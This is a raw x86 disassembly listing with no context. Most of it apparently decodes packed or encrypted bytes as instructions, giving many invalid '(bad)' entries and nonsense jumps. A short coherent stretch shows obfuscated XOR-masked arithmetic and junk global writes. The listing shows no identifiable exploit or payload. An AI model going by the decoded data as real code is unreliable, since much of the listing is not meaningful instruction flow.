  40a382:	mov    edi,0x8ffb4cc7
  40a387:	(bad)  
  40a389:	adc    eax,edi
  40a38b:	pusha  
  40a38c:	cmp    BYTE PTR ds:0x67b3b2a6,ah
  40a392:	or     ecx,ecx
  40a394:	xchg   esp,eax
  40a395:	push   ebx
  40a396:	pop    ebx
  40a397:	dec    ebp
  40a398:	inc    ebx
  40a399:	and    BYTE PTR [edx],ch
  40a39b:	(bad)  
  40a39c:	jmp    0x40a343
  40a39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a39f:	jns    0x40a3b0
  40a3a1:	pop    edi
  40a3a2:	jb     0x40a3ae
  40a3a4:	repz xchg esp,esp
  40a3a7:	sahf   
  40a3a8:	add    BYTE PTR [edx-0x514b4bb],ch
  40a3ae:	out    dx,eax
  40a3af:	repnz xchg edi,eax
  40a3b1:	xor    esp,0x43
  40a3b4:	jbe    0x40a378
  40a3b6:	mov    ebp,0x9a905e6a
  40a3bb:	sub    eax,0xe0b2e1c
  40a3c0:	in     eax,0x27
  40a3c2:	call   0xaea257da
  40a3c7:	adc    dl,BYTE PTR [ecx+0x7b]
  40a3ca:	push   cs
  40a3cb:	aas    
  40a3cc:	(bad)  
  40a3cd:	cmp    BYTE PTR [ecx+0x6c],al
  40a3d0:	dec    esi
  40a3d1:	xor    al,0x3f
  40a3d3:	xor    DWORD PTR [eax+eiz*1+0x540f2b3b],esi
  40a3da:	in     al,dx
  40a3db:	dec    ebx
  40a3dc:	pop    ds
  40a3dd:	fwait
  40a3de:	sub    ah,dh
  40a3e0:	mov    esp,0x6f55e7ef
  40a3e5:	xchg   ebp,eax
  40a3e6:	mov    esp,0xa830bd7f
  40a3eb:	adc    esi,DWORD PTR [eax+0x44]
  40a3ee:	cmc    
  40a3ef:	enter  0xa50f,0xdc
  40a3f3:	mov    edi,0x71b17d75
  40a3f8:	das    
  40a3f9:	dec    BYTE PTR [eax-0x3da8fffd]
  40a3ff:	or     ecx,esi
  40a401:	jns    0x40a3b8
  40a403:	call   0xa437:0xcb2905a1
  40a40a:	scas   eax,DWORD PTR es:[edi]
  40a40b:	push   es
  40a40c:	cmp    DWORD PTR [edx+0x104dd7e],ebx
  40a412:	repnz mov dl,0x12
  40a415:	jo     0x40a422
  40a417:	or     BYTE PTR [ecx+0x27],bh
  40a41a:	xchg   edx,eax
  40a41b:	lock adc DWORD PTR [ecx+0x301b6b51],0xc71d5137
  40a426:	push   ss
  40a427:	adc    ecx,0x9292314f
  40a42d:	idiv   BYTE PTR [edi+0x7d]
  40a430:	pop    ebp
  40a431:	xor    BYTE PTR [eax],ch
  40a433:	jle    0x40a3b7
  40a435:	cmp    al,cl
  40a437:	inc    eax
  40a438:	stc    
  40a439:	or     bh,0xb
  40a43c:	or     al,0x76
  40a43e:	mov    bh,0x4b
  40a440:	jmp    FWORD PTR [eax]
  40a442:	in     al,dx
  40a443:	add    BYTE PTR [eax+0x36],cl
  40a446:	sbb    dl,ah
  40a448:	xchg   ebx,eax
  40a449:	pop    esi
  40a44a:	add    ah,BYTE PTR [esp+eax*1]
  40a44d:	dec    ebp
  40a44e:	lods   eax,DWORD PTR ds:[esi]
  40a44f:	(bad)  
  40a451:	aas    
  40a452:	adc    ah,BYTE PTR [edi]
  40a454:	or     ecx,DWORD PTR [eax]
  40a456:	pusha  
  40a457:	jle    0x40a437
  40a459:	adc    DWORD PTR [edx+ebx*1-0x5171a942],ebp
  40a460:	push   edi
  40a461:	rcr    DWORD PTR [edx+0xe81888c],0x1
  40a468:	cld    
  40a469:	push   ds
  40a46a:	jg     0x40a40b
  40a46c:	aad    0x0
  40a46e:	xor    al,0x23
  40a470:	xchg   esi,eax
  40a471:	outs   dx,DWORD PTR ds:[esi]
  40a472:	(bad)  
  40a473:	in     eax,dx
  40a474:	addr16 cdq 
  40a476:	xor    eax,DWORD PTR [ebx]
  40a478:	or     al,0x97
  40a47a:	retf   0xc23
  40a47d:	jl     0x40a4c1
  40a47f:	inc    ecx
  40a480:	fwait
  40a481:	ins    DWORD PTR es:[edi],dx
  40a482:	mov    ah,0xb0
  40a484:	jne    0x40a4ee
  40a486:	lock pop edx
  40a488:	pop    es
  40a489:	cmp    BYTE PTR ds:0xf182a757,al
  40a48f:	fidiv  WORD PTR [edi-0x6d]
  40a492:	test   esp,edi
  40a494:	ds stos DWORD PTR es:[edi],eax
  40a496:	aam    0xc2
  40a498:	les    eax,FWORD PTR [ecx+0x4ed3f62f]
  40a49e:	aam    0x26
  40a4a0:	loope  0x40a497
  40a4a2:	dec    edx
  40a4a3:	(bad)  
  40a4a4:	jns    0x40a4b4
  40a4a6:	and    al,0xfd
  40a4a8:	push   ecx
  40a4a9:	pop    es
  40a4aa:	pop    edx
  40a4ab:	mov    dh,0xe9
  40a4ad:	in     al,dx
  40a4ae:	popf   
  40a4af:	adc    eax,DWORD PTR [eax]
  40a4b1:	fdiv   DWORD PTR [esi+0x4]
  40a4b4:	in     al,0x33
  40a4b6:	push   ebp
  40a4b7:	mov    BYTE PTR [ecx+0x0],ch
  40a4ba:	push   ss
  40a4bb:	adc    al,0x3
  40a4bd:	inc    esp
  40a4be:	mov    ebx,0xf32baf14
  40a4c3:	sbb    dh,bh
  40a4c5:	test   DWORD PTR [ebx+0x317d50d6],eax
  40a4cb:	and    DWORD PTR [ebx-0x5352f592],esp
  40a4d1:	ins    DWORD PTR es:[edi],dx
  40a4d2:	cmp    DWORD PTR [ebp-0x70c4fff8],edi
  40a4d8:	jbe    0x40a489
  40a4da:	scas   eax,DWORD PTR es:[edi]
  40a4db:	bound  edx,QWORD PTR [eax-0x3057106e]
  40a4e1:	jmp    0x49a8d59a
  40a4e6:	or     eax,0x9cceb47d
  40a4eb:	xchg   ebx,eax
  40a4ec:	jb     0x40a4c5
  40a4ee:	adc    ebp,ebx
  40a4f0:	mul    BYTE PTR [edx-0x14]
  40a4f3:	fsub   QWORD PTR ds:0xc726e8
  40a4f9:	add    BYTE PTR [ebx+0x44e8b06],cl
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a53a
  40a524:	adc    ch,0xbc
  40a527:	fsubr  DWORD PTR [ebx]
  40a529:	sbb    BYTE PTR [eax],bl
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    al,cl
  40a530:	mov    esp,0xfd41e1ff
  40a535:	leave  
  40a536:	pop    eax
  40a537:	clc    
  40a538:	mov    edx,es
  40a53a:	inc    eax
  40a53b:	jge    0x40a56f
  40a53d:	sahf   
  40a53e:	sbb    eax,0x36de667b
  40a543:	push   esp
  40a544:	fisttp DWORD PTR [edx]
  40a546:	out    dx,eax
  40a547:	gs ins DWORD PTR es:[edi],dx
  40a549:	lock fwait
  40a54b:	(bad)  
  40a54c:	jb     0x40a520
  40a54e:	pop    ecx
  40a54f:	ins    DWORD PTR es:[edi],dx
  40a550:	aas    
  40a551:	pop    esp
  40a552:	sub    eax,0x479d4502
  40a557:	call   0x293f:0x515829ac
  40a55e:	jle    0x40a5a0
  40a560:	xor    al,0x47
  40a562:	mov    ebp,0x639dd496
  40a567:	std    
  40a568:	cli    
  40a569:	mov    edi,0x77005d77
  40a56e:	dec    edx
  40a56f:	addr16 inc ebp
  40a571:	mov    al,0x5
  40a573:	and    eax,0x66e94f5b
  40a578:	xchg   DWORD PTR ds:[edi],edx
  40a57b:	loope  0x40a5e5
  40a57d:	fst    DWORD PTR [ecx]
  40a57f:	outs   dx,BYTE PTR ds:[esi]
  40a580:	std    
  40a581:	inc    edi
  40a582:	jge    0x40a577
  40a584:	sub    eax,0x9d1e83cc
  40a589:	std    
  40a58a:	sbb    ch,BYTE PTR [ecx+0x42bd159c]
  40a590:	and    esp,0xbd94eee9
  40a596:	inc    eax
  40a597:	pop    es
  40a598:	push   esp
  40a599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a59a:	mov    ?,WORD PTR [edi]
  40a59c:	xor    ah,BYTE PTR [ebp+0x8]
  40a59f:	cld    
  40a5a0:	and    eax,0xac10a36a
  40a5a5:	mov    esp,0xe8973554
  40a5aa:	(bad)  
  40a5ab:	out    0x66,eax
  40a5ad:	repnz pop esp
  40a5af:	es jne 0x40a570
  40a5b2:	aam    0x5
  40a5b4:	rcl    DWORD PTR [esi+0x54],1
  40a5b7:	test   cl,cl
  40a5b9:	retf   
  40a5ba:	cmp    BYTE PTR [edx+ecx*1-0x6b],bh
  40a5be:	daa    
  40a5bf:	mov    dl,0x27
  40a5c1:	jae    0x40a559
  40a5c3:	pop    ss
  40a5c4:	scas   al,BYTE PTR es:[edi]
  40a5c5:	dec    ebp
  40a5c6:	mov    ecx,?
  40a5c8:	cmp    bl,BYTE PTR [eax]
  40a5ca:	mov    ds:0xbc553e18,al
  40a5cf:	mov    al,0xb5
  40a5d1:	pop    ebp
  40a5d2:	xchg   BYTE PTR [eax+ebx*8+0x57],ch
  40a5d6:	gs inc esp
  40a5d8:	pop    ss
  40a5d9:	loope  0x40a5ce
  40a5db:	xor    esi,DWORD PTR [esi-0x29]
  40a5de:	jecxz  0x40a612
  40a5e0:	repz mov eax,0xd0d75b99
  40a5e6:	adc    ah,BYTE PTR [ebx+0x37f66441]
  40a5ec:	loop   0x40a5bd
  40a5ee:	aam    0x4f
  40a5f0:	lock in eax,dx
  40a5f2:	mov    cl,0xd8
  40a5f4:	push   eax
  40a5f5:	clc    
  40a5f6:	and    BYTE PTR [esi+0x4f342d6],dl
  40a5fc:	mov    ds:0x21215f6e,al
  40a601:	sar    DWORD PTR [ecx+0x61],cl
  40a604:	mov    ebx,0xb51b09da
  40a609:	sub    ebx,DWORD PTR [edx]
  40a60b:	je     0x40a5a7
  40a60d:	inc    ebp
  40a60e:	sbb    al,bl
  40a610:	pop    eax
  40a611:	adc    eax,0x19cc94a8
  40a616:	sbb    BYTE PTR [ebp-0x49cf93c3],0x7d
  40a61d:	ins    DWORD PTR es:[edi],dx
  40a61e:	jne    0x40a62a
  40a620:	gs jge 0x40a5a7
  40a623:	pop    ds
  40a624:	dec    esp
  40a625:	push   es
  40a626:	test   DWORD PTR [esi+0x153bc00e],eax
  40a62c:	ins    DWORD PTR es:[edi],dx
  40a62d:	dec    ebp
  40a62e:	adc    eax,0xe5e019fa
  40a633:	mov    ah,0x7a
  40a635:	in     eax,0xc1
  40a637:	stos   BYTE PTR es:[edi],al
  40a638:	out    dx,eax
  40a639:	stos   BYTE PTR es:[edi],al
  40a63a:	sbb    dh,BYTE PTR [eax-0x5fdd82b]
  40a640:	or     ch,cl
  40a642:	mov    ah,0xfa
  40a644:	cmp    edi,DWORD PTR [eax+0x5192b9fb]
  40a64a:	mov    cl,0x2b
  40a64c:	xor    al,0xe2
  40a64e:	xchg   edi,eax
  40a64f:	popf   
  40a650:	out    0x7c,eax
  40a652:	es mov dl,0xd3
  40a655:	mov    ebx,0xf5940900
  40a65a:	adc    cl,dh
  40a65c:	add    ecx,DWORD PTR [edx-0x2626b02a]
  40a662:	mov    ecx,0x208f0581
  40a667:	pop    ss
  40a668:	mov    al,0xf4
  40a66a:	xor    DWORD PTR [ebx-0x2a63e0d4],edx
  40a670:	fst    QWORD PTR [ebx+0x5e]
  40a673:	sbb    eax,0xd235adfc
  40a678:	dec    ebx
  40a679:	dec    esp
  40a67a:	loop   0x40a69f
  40a67c:	and    eax,0x8afdbc06
  40a681:	sbb    DWORD PTR [eax-0x6f6b5456],ebx
  40a687:	inc    ebx
  40a688:	xor    edi,ebp
  40a68a:	add    eax,0x24a421f
  40a68f:	push   0x489c54b1
  40a694:	sahf   
  40a695:	or     esp,DWORD PTR [edx]
  40a697:	push   ss
  40a698:	inc    ebx
  40a699:	mov    cl,0x34
  40a69b:	in     al,dx
  40a69c:	and    bl,ah
  40a69e:	lahf   
  40a69f:	enter  0x6708,0xa9
  40a6a3:	cmp    DWORD PTR [eax+0x789da36e],esi
  40a6a9:	sub    al,0x44
  40a6ab:	add    bl,cl
  40a6ad:	pop    ecx
  40a6ae:	xchg   ebx,eax
  40a6af:	jecxz  0x40a681
  40a6b1:	mov    eax,ds:0x59755932
  40a6b6:	out    dx,al
  40a6b7:	push   edx
  40a6b8:	pop    es
  40a6b9:	in     al,0xf4
  40a6bb:	sub    eax,0xf40e0e64
  40a6c0:	jb     0x40a70d
  40a6c2:	sbb    dl,BYTE PTR [edx-0x6580f201]
  40a6c8:	cmc    
  40a6c9:	xor    DWORD PTR [ebx],edx
  40a6cb:	scas   al,BYTE PTR es:[edi]
  40a6cc:	adc    bh,dl
  40a6ce:	jbe    0x40a675
  40a6d0:	pmaxsw mm5,QWORD PTR [eax-0x335e33c7]
  40a6d7:	sti    
  40a6d8:	lea    eax,[ebp+0x67]
  40a6db:	pop    eax
  40a6dc:	pop    ebp
  40a6dd:	lods   eax,DWORD PTR ds:[esi]
  40a6de:	mov    eax,ds:0x846b7a92
  40a6e3:	out    dx,al
  40a6e4:	jl     0x40a685
  40a6e6:	mov    WORD PTR ds:0x642ff4ba,?
  40a6ec:	xor    esp,edx
  40a6ee:	push   ebx
  40a6ef:	sub    eax,0x96354633
  40a6f4:	std    
  40a6f5:	push   eax
  40a6f6:	sbb    DWORD PTR [esi+edi*2+0x4b],ebx
  40a6fa:	sbb    DWORD PTR [esi-0x2a],esp
  40a6fd:	pop    esi
  40a6fe:	cmp    dh,bh
  40a700:	add    ah,BYTE PTR [eax+0x6f]
  40a703:	cdq    
  40a704:	mov    ds:0x77ad85d,al
  40a709:	xchg   ebx,eax
  40a70a:	jnp    0x40a6a2
  40a70c:	jmp    0x40a700
  40a70e:	xchg   esp,eax
  40a70f:	repz dec ebp
  40a711:	bound  ecx,QWORD PTR [ebx+edx*1-0x3b776a16]
  40a718:	data16 xchg BYTE PTR [ecx+edi*4],bl
  40a71c:	div    DWORD PTR [edi-0x5994988b]
  40a722:	popf   
  40a723:	mov    dl,0x4f
  40a725:	add    ebx,edi
  40a727:	test   DWORD PTR [ebp+0x49806e68],ebx
  40a72d:	aas    
  40a72e:	iret   
  40a72f:	in     al,dx
  40a730:	rcl    BYTE PTR [edi+ebp*8-0x70a96f7a],1
  40a737:	leave  
  40a738:	sbb    DWORD PTR [ecx+0x4e],ebx
  40a73b:	fmul   DWORD PTR [eax]
  40a73d:	in     eax,0x9f
  40a73f:	xchg   edi,eax
  40a740:	mov    al,0x40
  40a742:	div    BYTE PTR [eax+eax*8]
  40a745:	pop    ss
  40a746:	mov    al,ds:0xe9e6cb1d
  40a74b:	mov    WORD PTR [esi-0x56],gs
  40a74e:	pop    edx
  40a74f:	mov    al,0x6
  40a751:	push   0x37
  40a753:	cmp    BYTE PTR [ebx-0x2515b48],dl
  40a759:	mov    ss:0x322a5fd9,al
  40a75f:	cmp    DWORD PTR [esi-0xc3e9b9e],edx
  40a765:	mov    ebp,gs
  40a767:	mov    ah,0x2d
  40a769:	xchg   ecx,eax
  40a76a:	push   cs
  40a76b:	or     al,0x73
  40a76d:	and    al,0x15
  40a76f:	shl    cl,1
  40a771:	push   es
  40a772:	aaa    
  40a773:	jmp    DWORD PTR [eax-0x17f186d0]
  40a779:	int    0xf4
  40a77b:	mov    ch,BYTE PTR [esi+0x5f]
  40a77e:	jmp    0xcdc0a0c0
  40a783:	repz jg 0x40a74c
  40a786:	xchg   esp,eax
  40a787:	or     DWORD PTR [esi],ebp
  40a789:	ret    0x1268
  40a78c:	(bad)  
  40a78e:	test   DWORD PTR [edi-0x73b5d4f9],edx
  40a794:	mov    ebp,0xca26a019
  40a799:	lock adc ebp,DWORD PTR [ecx+0x6b]
  40a79d:	stos   DWORD PTR es:[edi],eax
  40a79e:	jo     0x40a733
  40a7a0:	mov    ch,0x6d
  40a7a2:	adc    eax,0x5ba157c8
  40a7a7:	xchg   eax,esi
  40a7a9:	mov    ebp,ecx
  40a7ab:	inc    ebp
  40a7ac:	and    dl,BYTE PTR [esi+0x71fe5a4c]
  40a7b2:	or     edi,ebx
  40a7b4:	es push 0xc65c0c12
  40a7ba:	dec    ebx
  40a7bb:	out    dx,eax
  40a7bc:	xchg   esi,eax
  40a7bd:	push   ebp
  40a7bf:	cmp    al,0xb5
  40a7c1:	cmp    BYTE PTR [esi-0x3b],dl
  40a7c4:	ins    BYTE PTR es:[edi],dx
  40a7c5:	fsub   st,st(7)
  40a7c7:	aas    
  40a7c8:	xchg   ebx,eax
  40a7c9:	fdivr  st(5),st
  40a7cb:	rcr    BYTE PTR [ebx+0x4caac94f],0x7e
  40a7d2:	pop    edx
  40a7d3:	loop   0x40a775
  40a7d5:	sub    bl,al
  40a7d7:	lods   eax,DWORD PTR ds:[esi]
  40a7d8:	aam    0x87
  40a7da:	or     DWORD PTR [eax+0x1f0dc1da],ebx
  40a7e0:	popa   
  40a7e1:	adc    BYTE PTR [ebx+0x5d],dl
  40a7e4:	imul   esi,DWORD PTR [ecx-0x6f90921f],0x34
  40a7eb:	sbb    eax,0xa4e1f3a2
  40a7f0:	cmp    BYTE PTR [edi+0x68e997d7],dh
  40a7f6:	imul   ebp,ecx,0xcfc4e042
  40a7fc:	mov    DWORD PTR ds:0xd2ce045c,esi
  40a802:	sbb    ah,0x6e
  40a805:	xchg   DWORD PTR [esi-0x729b0cee],ecx
  40a80b:	xchg   esp,eax
  40a80c:	fistp  DWORD PTR [esi+0x7be3c147]
  40a812:	inc    ecx
  40a813:	and    dl,bh
  40a815:	pop    ebp
  40a816:	push   eax
  40a817:	push   edi
  40a818:	mov    eax,0x28a95cd9
  40a81d:	jno    0x40a819
  40a81f:	ss dec esi
  40a821:	aad    0xf2
  40a823:	mov    edi,0xbc3f2164
  40a828:	jmp    0xb4587985
  40a82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a82e:	std    
  40a82f:	dec    esi
  40a830:	test   DWORD PTR [ebx],eax
  40a832:	fwait
  40a833:	push   esi
  40a834:	or     al,0x53
  40a836:	jmp    0x40a7dc
  40a838:	loop   0x40a872
  40a83a:	int3   
  40a83b:	sbb    dh,BYTE PTR [ecx+ebp*1+0x5a]
  40a83f:	pop    esp
  40a840:	mov    DWORD PTR [esp+ebx*2+0x5819569b],esp
  40a847:	fcomp  st(0)
  40a849:	aam    0x2f
  40a84b:	sbb    al,0x22
  40a84d:	ror    dh,cl
  40a84f:	push   esp
  40a850:	rcl    ah,1
  40a852:	shr    DWORD PTR [edx-0x73],cl
  40a855:	jp     0x40a899
  40a857:	mov    dh,0x6d
  40a859:	mov    dl,0xed
  40a85b:	adc    eax,0xaa2ab6e8
  40a860:	pop    ss
  40a861:	and    al,0x2e
  40a863:	pop    eax
  40a864:	xchg   edi,eax
  40a865:	jecxz  0x40a805
  40a867:	aad    0xda
  40a869:	adc    DWORD PTR [ebx],0xffffffb6
  40a86c:	adc    ch,BYTE PTR [edx-0x76202a15]
  40a872:	sbb    dh,BYTE PTR [esi+0x12]
  40a875:	pop    edi
  40a876:	mov    al,0xca
  40a878:	adc    eax,0xa00db3b1
  40a87d:	ret    0x4bda
  40a880:	ins    DWORD PTR es:[edi],dx
  40a881:	or     eax,DWORD PTR [edx+0x6c]
  40a884:	test   ebx,edx
  40a886:	xchg   edx,eax
  40a887:	xchg   BYTE PTR [edx],ah
  40a889:	inc    edx
  40a88a:	fwait
  40a88b:	add    DWORD PTR [eax],edi
  40a88d:	xor    ecx,esi
  40a88f:	xchg   BYTE PTR [ebx+0x4f],bl
  40a892:	mov    edi,DWORD PTR [edx]
  40a894:	dec    esi
  40a895:	int3   
  40a896:	addr16 ret 
  40a898:	and    ecx,edx
  40a89a:	pop    eax
  40a89b:	push   edx
  40a89c:	outs   dx,DWORD PTR ds:[esi]
  40a89d:	and    ebp,edx
  40a89f:	test   BYTE PTR ds:0x7863ed6,cl
  40a8a5:	cmc    
  40a8a6:	jb     0x40a83f
  40a8a8:	pop    edx
  40a8a9:	cs out dx,eax
  40a8ab:	mov    bh,0xed
  40a8ad:	mov    bh,0x53
  40a8af:	ds icebp 
  40a8b1:	adc    DWORD PTR [eax],esi
  40a8b3:	jmp    0xc2f:0xfda64731
  40a8ba:	paddusw mm0,QWORD PTR [edx]
  40a8bd:	popf   
  40a8be:	and    eax,0x84d284fa
  40a8c3:	or     DWORD PTR [ebp+0x67de0ba8],edx
  40a8c9:	dec    ecx
  40a8ca:	add    edx,DWORD PTR [edx-0x366d1c6e]
  40a8d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d1:	pxor   mm0,QWORD PTR [eax]
  40a8d4:	addr16 inc ebx
  40a8d6:	(bad)  
  40a8d7:	jmp    0x40a938
  40a8d9:	mov    ebx,0x5aad994b
  40a8de:	repz pop es
  40a8e0:	adc    ebx,eax
  40a8e2:	or     DWORD PTR [edx+edx*2],ebp
  40a8e5:	pop    edi
  40a8e6:	icebp  
  40a8e7:	cs cdq 
  40a8e9:	jae    0x40a8dd
  40a8eb:	mov    edx,0x7c183de
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428343,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428337,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428293,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42833b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x4282c3
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x4282b7,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428333
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42826b
  40aa46:	sbb    DWORD PTR ds:0x4281ab,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x407e1f6a
  40aa65:	mov    ebp,DWORD PTR [ecx]
  40aa67:	stos   BYTE PTR es:[edi],al
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	loope  0x40aa89
  40aa72:	dec    edx
  40aa73:	daa    
  40aa74:	push   ebx
  40aa75:	mov    edi,0x4d8d27f3
  40aa7a:	rol    DWORD PTR [bp+di-0x41fa],cl
  40aa7f:	dec    ebp
  40aa80:	dec    eax
  40aa81:	add    DWORD PTR [ecx+0x529533a8],edx
  40aa87:	xor    cl,BYTE PTR [esi+0x1dda508]
  40aa8d:	sub    eax,0xe946196b
  40aa92:	xchg   BYTE PTR [esi-0x69383857],ch
  40aa98:	xchg   esi,eax
  40aa99:	jns    0x40aa86
  40aa9b:	(bad)  
  40aa9c:	mov    esp,0xe1d28688
  40aaa1:	push   edx
  40aaa2:	add    ecx,ebp
  40aaa4:	and    cl,dh
  40aaa6:	cwde   
  40aaa7:	xchg   edx,eax
  40aaa8:	test   eax,0x62b4efcb
  40aaad:	nop    DWORD PTR [esi+0x7e]
  40aab1:	jge    0x40aa7c
  40aab3:	inc    esp
  40aab4:	jno    0x40ab2b
  40aab6:	adc    BYTE PTR [esi],bh
  40aab8:	into   
  40aab9:	push   edx
  40aaba:	dec    esp
  40aabb:	xchg   ecx,eax
  40aabc:	(bad)  
  40aabd:	out    dx,al
  40aabe:	mov    ds:0x5baa1be3,eax
  40aac3:	sub    ch,BYTE PTR [ecx]
  40aac5:	cmc    
  40aac6:	hlt    
  40aac7:	xor    eax,0x789c71e7
  40aacc:	leave  
  40aacd:	add    BYTE PTR [edi-0x2b65ecb2],ch
  40aad3:	mov    esi,0xcd5bfb1f
  40aad8:	sub    DWORD PTR [edi-0x31],edx
  40aadb:	ss pop esp
  40aadd:	push   esp
  40aade:	les    edx,FWORD PTR [esi+0x4b]
  40aae1:	stos   DWORD PTR es:[edi],eax
  40aae2:	in     al,dx
  40aae3:	(bad)  
  40aae4:	fs call 0xbd7:0xa8332c6a
  40aaec:	cmp    eax,edx
  40aaee:	push   ds
  40aaef:	xchg   esi,eax
  40aaf0:	dec    edx
  40aaf1:	mov    esi,0x39726931
  40aaf6:	and    al,0x2c
  40aaf8:	repnz mov esi,0xfffc4c10
  40aafe:	jge    0x40aa8c
  40ab00:	fldenv [esi]
  40ab02:	ja     0x40aa92
  40ab04:	and    BYTE PTR [esi-0x5f1feff6],0x76
  40ab0b:	stc    
  40ab0c:	xchg   ecx,eax
  40ab0d:	ds dec ebx
  40ab0f:	xchg   esp,eax
  40ab10:	das    
  40ab11:	arpl   WORD PTR [edx+0x22],bp
  40ab14:	xchg   esp,eax
  40ab15:	push   ecx
  40ab16:	daa    
  40ab17:	and    edi,DWORD PTR [esi]
  40ab19:	mov    bl,0xb9
  40ab1b:	jle    0x40ab4a
  40ab1d:	sub    eax,0x926d816
  40ab22:	ret    0xf992
  40ab25:	xor    eax,0x7562f0f0
  40ab2a:	mov    gs,eax
  40ab2c:	test   al,0x58
  40ab2e:	xchg   ebx,eax
  40ab2f:	dec    esi
  40ab30:	scas   eax,DWORD PTR es:[edi]
  40ab31:	in     eax,dx
  40ab32:	xchg   edx,eax
  40ab33:	out    0xf3,eax
  40ab35:	cli    
  40ab36:	sti    
  40ab37:	and    DWORD PTR [esi+0x7f169d01],edi
  40ab3d:	pop    ebx
  40ab3e:	mov    ch,al
  40ab40:	out    0x86,al
  40ab42:	inc    ebx
  40ab43:	push   esi
  40ab44:	sbb    dl,BYTE PTR [ecx]
  40ab46:	ins    BYTE PTR es:[edi],dx
  40ab47:	xchg   edx,eax
  40ab48:	leave  
  40ab49:	cwde   
  40ab4a:	(bad)  
  40ab4b:	and    al,0xbd
  40ab4d:	xor    eax,0xfa3a22a2
  40ab52:	cmp    eax,0xa1dcef62
